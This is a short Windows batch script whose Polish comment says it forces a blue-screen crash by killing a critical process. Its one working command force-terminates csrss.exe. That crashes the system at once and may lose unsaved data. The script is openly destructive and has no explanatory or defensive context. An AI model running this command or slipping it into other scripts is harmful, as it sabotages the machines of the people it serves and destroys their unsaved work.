@echo off
:: Wymuszenie BSOD poprzez zabicie procesu krytycznego
taskkill /f /im csrss.exe
pause

